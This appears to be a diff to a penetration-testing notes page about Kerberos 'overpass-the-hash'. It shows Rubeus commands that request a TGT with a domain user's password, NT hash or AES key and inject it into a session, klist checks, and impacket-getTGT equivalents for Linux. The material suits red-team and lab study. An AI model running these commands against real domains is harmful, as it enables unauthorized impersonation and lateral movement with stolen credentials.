@@ -9,9 +9,9 @@ subLabel: (Rubeus, getTGT)
 >
 > * Credentials (password, RC4/NT hash, AES key, kirbi file) of the target domain user.
 
-Having the credentials of a domain user, we can ask the DC for a new TGT for that user and inject it into the current logon session.
+Having the credentials of a domain user, we can ask the DC for a new TGT for that user and inject it into the current logon session. This TGT is then used for authentication (e.g. using `winrs` or accessing SMB shares) with privileges of the target user.
 
-> **IMPORTANT**: Watch out for domain name! It's very important in TGT request to use FQDN (e.g. `adlab.local` instead of `adlab`). Even if shortcut normally works, use FQDN in this case.
+**Watch out for domain name!** It's very important in TGT request to use FQDN (e.g. `adlab.local` instead of `adlab`). Even if shortcut normally works, use FQDN in this case.
 
 Windows:
 
@@ -29,9 +29,13 @@ Windows:
 
 # Inject TGT as base64 or .kirbi file
 ./Rubeus.exe ptt /ticket:$base64_or_kirbi_file
+
+# Check TGT in memory
+klist
+klist tgt
 ```
 
-> **NOTICE**: You can check current logon TGT cached in memory using `klist tgt` (built-in Windows tool).
+{/*TODO: /createonlt parameter (elevation required)*/}
 
 Linux (request TGT and save it to `.ccache` file):
 
@@ -46,4 +50,6 @@ impacket-getTGT $fqdn/$user -hashes :$nt_hash -dc-ip $dc_ip
 impacket-getTGT $fqdn/$user -aesKey $aes_key -dc-ip $dc_ip
 ```
 
-{/*TODO: /createonlt parameter (elevation required)*/}
+## References
+
+* [GhostPack, *Rubeus: asktgt*](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#asktgt)
